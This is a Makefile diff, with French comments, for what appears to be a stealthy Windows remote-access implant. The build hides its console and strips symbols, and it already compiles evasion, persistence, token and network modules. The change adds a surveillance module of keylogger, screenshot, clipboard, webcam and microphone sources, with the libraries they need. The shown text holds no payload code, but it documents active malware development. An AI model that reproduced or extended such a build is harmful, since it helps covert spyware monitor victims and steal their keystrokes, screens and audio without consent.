@@ -16,7 +16,7 @@ CFLAGS += -I./include -I./src
 
 # Flags pour cacher la console et strip les symbols
 LDFLAGS = -s -mwindows
-LDFLAGS += -lwinhttp -lws2_32 -ladvapi32
+LDFLAGS += -lwinhttp -lws2_32 -ladvapi32 -lvfw32 -lole32 -luuid
 
 # Flags de debug (décommenter pour debug)
 # CFLAGS += -g -DDEBUG
@@ -56,7 +56,13 @@ TASKS_SRC = $(SRC_DIR)/tasks/dispatcher.c \
             $(SRC_DIR)/tasks/handlers/persist.c \
             $(SRC_DIR)/tasks/handlers/token.c
 
-ALL_SRC = $(CORE_SRC) $(CRYPTO_SRC) $(UTILS_SRC) $(EVASION_SRC) $(NETWORK_SRC) $(TASKS_SRC)
+SURVEILLANCE_SRC = $(SRC_DIR)/surveillance/keylogger.c \
+                   $(SRC_DIR)/surveillance/screenshot.c \
+                   $(SRC_DIR)/surveillance/clipboard.c \
+                   $(SRC_DIR)/surveillance/webcam.c \
+                   $(SRC_DIR)/surveillance/microphone.c
+
+ALL_SRC = $(CORE_SRC) $(CRYPTO_SRC) $(UTILS_SRC) $(EVASION_SRC) $(NETWORK_SRC) $(TASKS_SRC) $(SURVEILLANCE_SRC)
 
 # Fichiers objets
 OBJ = $(patsubst $(SRC_DIR)/%.c,$(BUILD_DIR)/%.o,$(ALL_SRC))
@@ -89,6 +95,7 @@ dirs:
 	@mkdir -p $(BUILD_DIR)/evasion
 	@mkdir -p $(BUILD_DIR)/network
 	@mkdir -p $(BUILD_DIR)/tasks/handlers
+	@mkdir -p $(BUILD_DIR)/surveillance
 	@mkdir -p $(BIN_DIR)
 
 $(EXE_TARGET): $(OBJ)
